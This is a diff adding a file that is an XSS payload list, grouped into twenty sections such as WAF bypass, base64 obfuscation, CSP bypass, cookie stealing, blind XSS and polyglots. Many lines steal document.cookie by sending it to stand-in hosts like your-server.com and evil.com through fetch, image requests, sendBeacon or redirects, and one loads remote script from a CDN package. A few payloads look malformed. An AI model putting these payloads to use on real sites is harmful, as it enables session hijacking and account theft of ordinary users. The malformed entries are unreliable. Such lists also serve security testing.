@@ -1,0 +1,162 @@
+<!-- ==================== SECTION 1: BASIC EVENTS ==================== -->
+<svg/onload=alert(document.cookie)>
+<img src=x onerror=alert(document.cookie)>
+<body onload=alert(document.cookie)>
+<input onfocus=alert(document.cookie) autofocus>
+<details open ontoggle=alert(document.cookie)>
+<iframe src="javascript:alert(document.cookie)">
+<object data="javascript:alert(document.cookie)">
+
+<!-- ==================== SECTION 2: WAF BYPASS ==================== -->
+<ScRiPt>alert(document.cookie)</ScRiPt>
+<scr<script>ipt>alert(document.cookie)</scr<script>ipt>
+<svg/onload=alert`${document.cookie}`>
+<svg onload=alert(1)//
+<svg/onload=alert(1)>
+
+<!-- ==================== SECTION 3: HTML ENTITY ENCODING ==================== -->
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(document.cookie)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(document.cookie)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+
+<!-- ==================== SECTION 4: BASE64 & OBFUSCATION ==================== -->
+<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+<svg/onload=Function`a${atob`YWxlcnQoZG9jdW1lbnQuY29va2llKQ`}```()>
+<svg/onload=setTimeout`alert\x28document.cookie\x29`>
+
+<!-- ==================== SECTION 5: JAVASCRIPT PROTOCOL ==================== -->
+javascript:alert(document.cookie)
+jAvAsCrIpT:alert(document.cookie)
+javaSCRIPT:alert`${document.cookie}`
+javascript:fetch('https://your-server.com/steal?c='+document.cookie)
+
+<!-- ==================== SECTION 6: DOM BASED ==================== -->
+#"><img src=x onerror=alert(document.cookie)>
+"><svg/onload=alert(document.cookie)>
+';alert(document.cookie);//
+"-alert(document.cookie)-"
+\';alert(document.cookie);//
+
+<!-- ==================== SECTION 7: CSP BYPASS ==================== -->
+<script src="https://rawcdn.githack.com/username/payload.js"></script>
+<script src="data:text/javascript,alert(document.cookie)"></script>
+<link rel=import href="https://your-server.com/xss.html">
+<iframe srcdoc='<svg onload=alert(document.cookie)>'>
+
+<!-- ==================== SECTION 8: COOKIE STEALING ==================== -->
+<script>fetch('https://your-collaborator.com/steal?cookie='+document.cookie);</script>
+<img src=x onerror="location.href='https://your-server.com/steal.php?c='+document.cookie">
+<svg/onload="new Image().src='https://your-server.com/log?c='+document.cookie">
+
+<!-- ==================== SECTION 9: POLYGLOT (UNIVERSAL) ==================== -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(document.cookie))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e
+
+<!-- ==================== SECTION 10: EVENT HANDLERS (VECTOR) ==================== -->
+onload=alert(document.cookie)
+onerror=alert(document.cookie)
+onclick=alert(document.cookie)
+onmouseover=alert(document.cookie)
+onfocus=alert(document.cookie)
+oninput=alert(document.cookie)
+onchange=alert(document.cookie)
+onreset=alert(document.cookie)
+onsubmit=alert(document.cookie)
+onkeydown=alert(document.cookie)
+onkeyup=alert(document.cookie)
+onkeypress=alert(document.cookie)
+onauxclick=alert(document.cookie)
+ondblclick=alert(document.cookie)
+oncontextmenu=alert(document.cookie)
+onwheel=alert(document.cookie)
+onscroll=alert(document.cookie)
+oncopy=alert(document.cookie)
+oncut=alert(document.cookie)
+onpaste=alert(document.cookie)
+
+<!-- ==================== SECTION 11: MEDIA TAGS ==================== -->
+<audio src=x onerror=alert(document.cookie)>
+<video src=x onerror=alert(document.cookie)>
+<source src=x onerror=alert(document.cookie)>
+<track src=x onerror=alert(document.cookie)>
+
+<!-- ==================== SECTION 12: FORM & INPUT ==================== -->
+<input type="image" src=x onerror=alert(document.cookie)>
+<input type="text" value="XSS" onfocus=alert(document.cookie) autofocus>
+<textarea onfocus=alert(document.cookie) autofocus></textarea>
+<select onfocus=alert(document.cookie) autofocus></select>
+
+<!-- ==================== SECTION 13: META & LINK ==================== -->
+<meta http-equiv="refresh" content="0;javascript:alert(document.cookie)">
+<link rel="stylesheet" href="javascript:alert(document.cookie)">
+<base href="javascript:alert(document.cookie)//">
+
+<!-- ==================== SECTION 14: ADVANCED OBFUSCATION ==================== -->
+<svg/onload=top[8680439..toString(30)](document.cookie)>
+<svg/onload=self[`${atob`YWxlcnQ`}`]`${document.cookie}`>
+<svg/onload=window[``]() alert(document.cookie)
+<svg/onload=parent[`al${`ert`}`](document.cookie)
+
+<!-- ==================== SECTION 15: BLIND XSS ==================== -->
+<script src="https://your-blind-xss-collector.com/payload.js"></script>
+<img src=x onerror="fetch('https://your-blind-xss.com/x?c='+document.cookie)">
+<svg/onload="navigator.sendBeacon('https://your-blind-xss.com/log', document.cookie)">
+
+<!-- ==================== SECTION 16: SHORTEST PAYLOADS ==================== -->
+<svg/onload=alert(1)>
+<svg/onload=alert`1`>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+
+<!-- ==================== SECTION 17: WITHOUT ALERT/CONSOLE ==================== -->
+<script>throw document.cookie</script>
+<script>debugger;document.cookie</script>
+<script>Function`${document.cookie}`</script>
+<script>location=document.cookie</script>
+
+<!-- ==================== SECTION 18: WEB WORKER XSS ==================== -->
+<script>var w=new Worker('data:text/javascript,postMessage(document.cookie)');w.onmessage=alert</script>
+
+<!-- ==================== SECTION 19: SERVICE WORKER XSS ==================== -->
+<script>navigator.serviceWorker.register('https://your-server.com/sw.js?v='+document.cookie)</script>
+
+<!-- ==================== SECTION 20: 2026 LATEST TRENDS ==================== -->
+<svg/onload=import('data:text/javascript,alert(document.cookie)')>
+<svg/onload=import('//cdn.jsdelivr.net/npm/xss-payload@latest/payload.js')>
+<iframe srcdoc='<script>fetch("//evil.com/"+document.cookie)</script>'>
+<svg/onload="window.location='http://evil.com/?c='+document.cookie">
+<script>window.location='http://evil.com/?c='+document.cookie</script>
+
+
+<svg/onload=alert`${document.cookie}`>
+<iframe srcdoc='<svg onload=alert(document.cookie)>'>
+<img src=x:alert(alt) onerror=eval(src) alt=document.cookie>
+<javascript:fetch`//${document.cookie}.your-server.com`>
+<svg><script>alert(1)</script>
+"><img src=x id=dm onerror=eval(id)>
+<body onload="#".substr(alert(document.cookie))>
+<input onfocus="alert(1)" autofocus>
+<details open ontoggle="alert(1)">
+<svg><animate onbegin=alert(1) attributeName=x>
+<math href="javascript:alert(1)">x</math>
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
+<svg/onload=location='javascript:alert`1`'>
+<iframe onload="this.src='javascript:alert(1)'">
+<object data="javascript:alert(1)">
+<svg><script href="data:,alert(1)"/>
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+<svg/onload=setTimeout`alert\x281\x29`>
+<svg/onload=import('data:text/javascript,alert(1)')>
+"><svg/onload=top[8680439..toString(30)](1)>
+"><svg/onload=top[atob`YWxlcnQ`]`${document.cookie}`>
+"><svg/onload=self[`${atob`YWxlcnQ`}`]`1`>
+<svg/onload=function::`alert\x281\x29`()>
+<svg/onload=window[``]() alert(1)
+"><svg/onload=top[8680439..toString(30)]`1`>
+<svg><script>&#97&#108&#101&#114&#116(1)</script>
+"><svg><script>self[`${atob`YWxlcnQ`}`]`${document.cookie}`</script>
+<img src=x onerror=this.src='javascript:alert(1)'>
+<svg/onload=write(atob`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`)>
+<svg/onload=Function`a${atob`YWxlcnQoMSk`}```()>
